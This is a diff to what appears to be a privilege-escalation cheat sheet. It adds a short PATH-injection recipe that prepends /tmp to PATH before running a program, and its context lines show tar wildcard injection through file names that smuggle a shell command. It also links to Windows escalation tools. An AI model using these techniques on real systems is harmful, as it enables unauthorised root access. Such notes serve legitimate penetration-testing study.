@@ -878,6 +878,16 @@ touch -- "--checkpoint-action=exec=sh demo.sh"
 touch -- "--checkpoint=1"
 ```
 
+PATH Injection
+
+```
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/raj/script
+./shell
+whoami
+```
+
 ### Windows
 
 TODO: [https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
